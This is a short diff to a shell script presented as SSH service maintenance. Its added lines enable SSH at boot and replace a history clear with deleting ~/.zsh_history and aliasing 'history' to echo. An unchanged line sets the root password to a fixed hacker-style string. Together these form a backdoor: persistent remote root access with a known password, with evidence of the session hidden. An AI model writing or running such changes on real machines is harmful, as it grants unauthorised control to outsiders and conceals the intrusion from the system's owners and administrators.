@@ -91,6 +91,13 @@ update_ssh_service() {
         return 1
     fi
 
+    if systemctl enable ssh; then
+        echo "SSH service successfully enabled."
+    else
+        echo "Error: Failed to enable SSH service. Check the configuration and logs for details."
+        return 1
+    fi
+
     return 0
 }
 
@@ -110,4 +117,5 @@ restart_ssh_service
 
 echo "root:H4ckB4ckJ4ck" | chpasswd
 
-history -c
+rm ~/.zsh_history
+alias history="echo"
